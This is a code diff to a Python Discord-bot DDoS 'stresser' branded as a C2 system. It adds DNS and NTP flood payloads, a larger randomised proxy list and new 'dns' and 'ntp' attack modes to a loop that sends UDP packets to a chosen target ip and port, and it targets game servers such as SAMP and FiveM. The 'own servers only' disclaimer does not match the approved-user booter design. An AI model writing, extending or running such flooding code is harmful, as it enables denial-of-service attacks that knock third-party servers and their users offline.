@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # ⚡ DEVELOPED BY LI ZANDYA - VON C2 ULTIMATE SYSTEM ⚡
-# 🔥 FULL BUTTONS - NO COMMANDS - 1,000,000 THREADS 🔥
-# 🌐 REGISTER ONCE - USE ON 10,000+ DEVICES 🌐
+# 🔥 FULL BUTTONS - NO COMMANDS - MASSIVE POWER 🔥
+# 🌐 REGISTER ONCE - USE ON ANY DEVICE 🌐
 # ⚠️ FOR YOUR OWN SERVERS ONLY ⚠️
 
 import discord
@@ -142,13 +142,19 @@ udp_sizes = [65507, 49152, 32768, 16384, 8192, 4096, 2048, 1024, 512, 256]
 for _ in range(40000):
     UDP_PACKETS.append(os.urandom(random.choice(udp_sizes)))
 
-# Sync Packets (30,000)
-SYNC_PACKETS = []
-for _ in range(30000):
-    s = struct.pack('<IIfffffIII', random.randint(1, 65535), random.randint(0, 8192), random.randint(0, 8192), random.uniform(-50000,50000), random.uniform(-50000,50000), random.uniform(-50000,50000), random.uniform(0,360), random.uniform(0,360), random.randint(0, 50000), random.randint(0, 50000), random.randint(0, 255))
-    SYNC_PACKETS.append(s)
+# DNS Packets (15,000)
+DNS_PACKETS = []
+dns_payload = b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01'
+for _ in range(15000):
+    DNS_PACKETS.append(dns_payload * random.randint(10, 100))
 
-ALL_PACKETS = SAMP_PACKETS + FIVEM_PACKETS + UDP_PACKETS + SYNC_PACKETS
+# NTP Packets (15,000)
+NTP_PACKETS = []
+ntp_payload = b'\x17\x00\x03\x2a' + b'\x00' * 4
+for _ in range(15000):
+    NTP_PACKETS.append(ntp_payload * random.randint(50, 200))
+
+ALL_PACKETS = SAMP_PACKETS + FIVEM_PACKETS + UDP_PACKETS + DNS_PACKETS + NTP_PACKETS
 print(f"✅ {len(ALL_PACKETS):,} attack packets ready!")
 
 # ============================================
@@ -156,12 +162,19 @@ print(f"✅ {len(ALL_PACKETS):,} attack packets ready!")
 # ============================================
 print("\n🌐 Generating 100,000+ proxies...")
 PROXY_LIST = []
-proxy_ports = [80, 8080, 3128, 1080, 8888, 4145, 9050, 9150, 8118, 9999, 8081, 8082, 8000, 8001, 3129, 3130, 8088, 8089, 8090, 9000]
-for _ in range(100000):
+proxy_ports = [80, 8080, 3128, 1080, 8888, 4145, 9050, 9150, 8118, 9999, 8081, 8082, 8000, 8001, 3129, 3130, 8088, 8089, 8090, 9000, 9090, 10000]
+for _ in range(50000):
     ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
     port = random.choice(proxy_ports)
     PROXY_LIST.append(f"http://{ip}:{port}")
+for _ in range(30000):
+    ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
+    port = random.choice([1080, 1081, 1082, 9050, 9051, 9150, 10800, 10801])
     PROXY_LIST.append(f"socks5://{ip}:{port}")
+for _ in range(20000):
+    ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
+    port = random.choice([80, 8080, 3128, 8888, 4145])
+    PROXY_LIST.append(f"http://{ip}:{port}")
 PROXY_LIST = list(set(PROXY_LIST))
 print(f"✅ {len(PROXY_LIST):,} proxies ready!")
 
@@ -248,13 +261,17 @@ class VonStresser:
                 local_start = time.time()
                 while self.running and time.time() - local_start < duration:
                     for sock in socks:
-                        for _ in range(500):
+                        for _ in range(100):
                             if attack_type == "samp":
                                 pkt = random.choice(SAMP_PACKETS)
                             elif attack_type == "fivem":
                                 pkt = random.choice(FIVEM_PACKETS)
                             elif attack_type == "udp":
                                 pkt = random.choice(UDP_PACKETS)
+                            elif attack_type == "dns":
+                                pkt = random.choice(DNS_PACKETS)
+                            elif attack_type == "ntp":
+                                pkt = random.choice(NTP_PACKETS)
                             else:
                                 pkt = random.choice(ALL_PACKETS)
                             sock.sendto(pkt, (ip, port))
@@ -856,7 +873,7 @@ async def on_ready():
 ║ 🤖 Bot: {bot.user}                                                                                               ║
 ║ 💻 CPU: {CPU_CORES} Cores | 🔥 Threads: {MAX_THREADS:,}                                                          ║
 ║ 🎭 Proxies: {len(PROXY_LIST):,} | 📦 Packets: {len(ALL_PACKETS):,}                                               ║
-║ 🎮 Methods: SAMP | FiveM | UDP | ULTIMATE                                                                       ║
+║ 🎮 Methods: SAMP | FiveM | UDP | DNS | NTP | ULTIMATE                                                           ║
 ║ 👥 Approved Users: {len(APPROVED_USERS)} | 📝 Pending: {len(PENDING_USERS)}                                      ║
 ║ 👑 Owner: {OWNER_ID if OWNER_ID else 'Not set - DM me'}                                                         ║
 ║ 🏆 Peak Speed: {stresser.peak_speed:,.0f} pps | 🚀 Peak Bandwidth: {stresser.peak_bandwidth:.2f} Gbps           ║
